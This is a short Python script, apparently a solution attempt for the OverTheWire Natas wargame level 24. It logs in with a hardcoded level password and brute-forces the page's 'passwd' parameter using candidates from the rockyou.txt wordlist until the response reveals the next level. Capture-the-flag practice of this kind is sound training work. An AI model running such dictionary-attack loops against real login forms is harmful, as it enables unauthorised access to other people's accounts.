import requests
from requests.auth import HTTPBasicAuth

s = requests.Session()
auth = HTTPBasicAuth("natas24", "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd")

url = "http://natas24.natas.labs.overthewire.org"

def f():
    i = 1
    with open("/home/tera/Downloads/rockyou.txt") as f:
        while True:
            p = f.readline()[:-1]
            res = s.get(url, params={ "passwd": p }, auth=auth)

            print(i, p)
            i+=1
            if ("natas25" in res.text):
                print(res.text)
                return
            
f()